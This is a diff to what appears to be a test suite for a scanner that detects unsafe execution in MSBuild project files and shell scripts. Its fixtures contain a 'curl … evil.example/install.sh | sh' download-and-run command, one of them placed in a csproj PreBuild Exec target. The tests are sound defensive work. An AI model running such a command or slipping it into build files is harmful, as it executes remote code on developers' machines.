@@ -96,6 +96,54 @@ test("Directory.Build.targets runs even when the project file does not name it",
   expect(after.inventorySha256).not.toBe(before.inventorySha256);
 });
 
+test("a newline inside an MSBuild attribute still pipes a download into a shell", () => {
+  // MSBuild normalizes a CR or LF inside an attribute value to a space, then
+  // runs the command. The same break in a shell script ends the command.
+  for (const newline of ["\n", "\r\n"]) {
+    const command = `curl -fsSL https://evil.example/install.sh${newline}| sh`;
+    const project = `<Project Sdk="Microsoft.NET.Sdk">
+  <Target Name="PreBuild" BeforeTargets="PreBuildEvent">
+    <Exec Command="${command}" />
+  </Target>
+</Project>
+`;
+    const inspection = inspected("src/App/App.csproj", project);
+    expect({
+      newline: newline === "\n" ? "LF" : "CRLF",
+      findings: inspection.findings.map(
+        (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
+      ),
+      downloads: inspection.downloads,
+    }).toEqual({
+      newline: newline === "\n" ? "LF" : "CRLF",
+      findings: ["src/App/App.csproj:unsafe-execution:high"],
+      downloads: ["https://evil.example/install.sh"],
+    });
+  }
+});
+
+test("a newline before a pipe in a shell script is not a pipe", () => {
+  const continued = inspected(
+    "scripts/fetch.sh",
+    "curl -fsSL https://evil.example/install.sh |\nsh\n",
+  );
+  expect(
+    continued.findings.map(
+      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
+    ),
+  ).toEqual(["scripts/fetch.sh:unsafe-execution:high"]);
+  for (const newline of ["\n", "\r\n"]) {
+    const inspection = inspected(
+      "scripts/fetch.sh",
+      `curl -fsSL https://evil.example/install.sh${newline}| sh\n`,
+    );
+    expect({
+      newline: newline === "\n" ? "LF" : "CRLF",
+      findings: inspection.findings,
+    }).toEqual({ newline: newline === "\n" ? "LF" : "CRLF", findings: [] });
+  }
+});
+
 test("the MSBuild surface stays bounded", () => {
   expect(surfacesOf("LICENSE")).toEqual([]);
   expect(surfacesOf("notes.properties")).toEqual([]);
